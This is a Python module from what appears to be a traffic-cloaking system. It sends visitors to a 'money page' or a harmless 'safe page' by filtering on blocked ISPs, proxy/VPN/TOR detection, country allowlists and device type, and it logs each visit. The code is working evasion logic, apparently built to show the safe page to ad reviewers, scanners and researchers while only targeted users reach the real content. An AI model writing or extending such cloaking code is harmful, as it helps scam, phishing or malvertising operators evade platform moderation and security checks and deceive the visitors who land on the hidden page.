"""
Decision engine: given a visitor's IP + User-Agent and the domain config,
decide whether to send them to the money page or the safe page.

Decision order:
  1. Blocked ISP          → safe
  2. Proxy / VPN / TOR    → safe
  3. Country not allowed  → safe
  4. Device type filtered → safe
  5. Passes all checks    → money
"""
from core import ipgeo, proxycheck
from core.useragent import parse as parse_ua, is_allowed as device_allowed
from db.models import domain_get, visit_log


class FlowResult:
    __slots__ = ("action", "redirect_url", "ip_info", "proxy", "device_type", "os")

    def __init__(self, action, redirect_url, ip_info, proxy, device_type="", os=""):
        self.action = action            # "money" | "safe"
        self.redirect_url = redirect_url
        self.ip_info = ip_info
        self.proxy = proxy
        self.device_type = device_type
        self.os = os


def evaluate(domain: str, token: str, ip: str, user_agent: str = "") -> FlowResult:
    """
    Evaluate visitor and return a FlowResult.
    Always logs the visit to the visits table.
    """
    row = domain_get(domain)
    if not row:
        return FlowResult("safe", "", {}, False)

    safe_url  = row["safe_url"]  or ""
    money_url = row["money_url"] or safe_url

    # 1. Geo lookup
    geo          = ipgeo.lookup(ip)
    country_code = geo.get("country_code", "")
    isp          = geo.get("isp", "")

    # 2. Blocked ISP check
    blocked_isps = [x.strip() for x in (row["blocked_isps"] or "").split("|") if x.strip()]
    if any(b.lower() in isp.lower() for b in blocked_isps):
        _log(domain, token, ip, geo, "safe", False, "unknown", "other")
        return FlowResult("safe", safe_url, geo, False)

    # 3. Proxy / VPN / TOR check
    proxy_info = proxycheck.check(ip)
    proxy      = proxy_info.get("proxy", False)
    if proxy:
        _log(domain, token, ip, geo, "safe", True, "unknown", "other")
        return FlowResult("safe", safe_url, geo, True)

    # 4. Country whitelist check
    allowed_countries = [c.strip().upper() for c in (row["countries"] or "").split(",") if c.strip()]
    if allowed_countries and country_code.upper() not in allowed_countries:
        _log(domain, token, ip, geo, "safe", False, "unknown", "other")
        return FlowResult("safe", safe_url, geo, False)

    # 5. Device / OS filter
    ua_result     = parse_ua(user_agent)
    device_filter = row["device_filter"] or "all"
    if not device_allowed(ua_result, device_filter):
        _log(domain, token, ip, geo, "safe", False, ua_result.device_type, ua_result.os)
        return FlowResult("safe", safe_url, geo, False, ua_result.device_type, ua_result.os)

    # 6. Passes all checks → money
    _log(domain, token, ip, geo, "money", False, ua_result.device_type, ua_result.os)
    return FlowResult("money", money_url, geo, False, ua_result.device_type, ua_result.os)


def _log(domain, token, ip, geo, action, proxy, device_type, os):
    visit_log(
        domain=domain,
        token=token,
        ip=ip,
        country=geo.get("country", ""),
        country_code=geo.get("country_code", ""),
        isp=geo.get("isp", ""),
        action=action,
        proxy=proxy,
        device_type=device_type,
        os=os,
    )
